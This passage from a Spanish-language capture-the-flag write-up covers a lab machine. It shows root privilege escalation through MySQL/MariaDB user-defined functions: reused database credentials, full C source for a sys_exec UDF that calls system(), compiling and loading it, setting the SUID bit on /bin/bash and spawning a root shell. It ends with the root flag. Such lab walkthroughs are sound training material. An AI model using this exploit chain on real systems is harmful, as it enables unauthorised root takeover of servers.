Vemos que esta el puerto `3306` abierto de forma local que se corresponde con el de `MySQL`, si recordamos encontramos unas credenciales en el dominio `gitea.dl` que eran lo siguiente:

```
User: admin
Pass: PassAdmin123-
```

Vamos a probar si podemos entrar con dichas credenciales:

```shell
mysql -u admin -pPassAdmin123-
```

### Escalada con UDF (User-Defined Functions)

Vemos que si nos deja, vamos a probar a realizar una tecnica para aprovechar una vulnerabilidad llamada `Escalada con UDF (User-Defined Functions)`, por lo que vamos a probar a realizar una tecnica para aprovechar eso en tal caso de que lo tuviera.

```shell
cd /tmp
nano lib_mysqludf_sys.c

#Dentro del nano
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql/mysql.h>

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
        strcpy(message, "sys_exec() takes exactly one string argument.");
        return 1;
    }
    return 0;
}

long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->args[0]) {
        return system(args->args[0]);
    }
    return -1;
}

my_bool sys_exec_deinit(UDF_INIT *initid) {
    return 0;
}
```

Metemos ese codigo para que cuando llamemos a la funcion podamos ejecutar comandos.

Vamos a compilarlo de la siguiente forma:

```shell
gcc -shared -o lib_mysqludf_sys.so -fPIC lib_mysqludf_sys.c -I/usr/include/mysql/ -L/usr/lib/ -lmariadbclient
mv /tmp/lib_mysqludf_sys.so /usr/lib/mysql/plugin/
```

Podemos mover el binario a la carpeta `plugins` de `MySQL` ya que tiene los siguientes permisos:

```shell
ls -la /usr/lib/mysql/
```

Info:

```
drwxr-xrwx 1 root root 4096 Feb 27 13:33 plugin
```

Ahora vamos a cargar la funcion de lo que hemos creado de la siguiente forma:

```shell
mysql -u admin -pPassAdmin123-
```

Vamos a realizar lo siguiente:

```mysql
USE mysql;
```

Info:

```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

Ahora vamos a cargar la funcion:

```mysql
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
```

Info:

```
MariaDB [mysql]> CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
Query OK, 0 rows affected (0.001 sec)
```

Ahora podremos llamar a esta funcion que hemos creado como `sys_exec` y ejecutar cualquier comando como `root`, por lo que haremos lo siguiente:

```mysql
SELECT sys_exec('chmod u+s /bin/bash');
```

Info:

```
+---------------------------------+
| sys_exec('chmod u+s /bin/bash') |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row in set (0.006 sec)
```

Vemos que ha funcionado por que nos salio un `0` y un `1` seria un error, por lo que si ahora salimos y listamos los permisos de la `bash` veremos lo siguiente:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Vemos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la flag de `root`:

> root.txt

```
d5a28ab3b2fe6d8191eb01fc3a76f5cb
```
